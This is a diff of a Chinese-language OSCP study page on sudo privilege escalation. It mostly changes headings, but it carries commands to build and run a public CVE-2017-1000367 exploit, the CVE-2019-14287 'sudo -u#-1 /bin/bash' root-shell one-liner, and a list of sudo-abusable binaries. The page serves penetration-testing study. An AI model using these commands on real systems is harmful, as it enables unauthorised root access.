@@ -3,14 +3,14 @@
 ---
 
 ## Table of Contents
- * [sudo 滥用](#sudo-滥用)
- * [sudo 漏洞](#sudo-漏洞)
-  * [CVE-2017-1000367](#CVE-2017-1000367)
-  * [CVE-2019-14287](#CVE-2019-14287)
-  * [CVE-2021-3156](#CVE-2021-3156)
+ - [sudo 滥用](#sudo-滥用)
+ - [sudo 漏洞](#sudo-漏洞)
+  - [CVE-2017-1000367](#CVE-2017-1000367)
+  - [CVE-2019-14287](#CVE-2019-14287)
+  - [CVE-2021-3156](#CVE-2021-3156)
 
 ---
-# [](#sudo-滥用) sudo 滥用
+## sudo 滥用
 已知的可用来sudo滥用提权的`linux`可执行文件列表
 
 | 命令   | 命令     | 命令       | 命令      | 命令         | 命令        | 命令    | 
@@ -19,8 +19,8 @@
 |[man](https://github.com/NongCloud/oscp-Learn/blob/master/Privilege-Escalation/sudo/Details/man.md)| [rpm](https://github.com/NongCloud/oscp-Learn/blob/master/Privilege-Escalation/sudo/Details/rpm.md)| [setarch](https://github.com/NongCloud/oscp-Learn/blob/master/Privilege-Escalation/sudo/Details/setarch.md)| [stdbuf](https://github.com/NongCloud/oscp-Learn/blob/master/Privilege-Escalation/sudo/Details/stdbuf.md)| [tcpdump](https://github.com/NongCloud/oscp-Learn/blob/master/Privilege-Escalation/sudo/Details/tcpdump.md)| [xargs](https://github.com/NongCloud/oscp-Learn/blob/master/Privilege-Escalation/sudo/Details/xargs.md)|
 
 ---
-# [](#sudo-漏洞) sudo 漏洞
-* [](CVE-2017-1000367)CVE-2017-1000367
+## sudo 漏洞
+### CVE-2017-1000367
 这个项目指定了通过/usr/bin/sum来sudo提权，请根据自己的sudo情况修改文件名
 ```
 git clone https://github.com/c0d3z3r0/sudo-CVE-2017-1000367.git
@@ -28,7 +28,7 @@ cd sudo-CVE-2017-1000367
 gcc -o sudopwn sudopwn.c -lutil
 ./sudopwn
 ```
-* [](CVE-2019-14287 )CVE-2019-14287
+## CVE-2019-14287
  
 ```
 $ sudo -u#-1 /bin/bash
@@ -36,7 +36,7 @@ $ sudo -u#-1 /bin/bash
 $ sudo -u#4294967295 /bin/bash
 ```
 
- * [](CVE-2021-3156)CVE-2021-3156
+# ## CVE-2021-3156
 基于堆的缓冲区溢出漏洞
 受影响版本
 Sudo 1.8.2 - 1.8.31p2
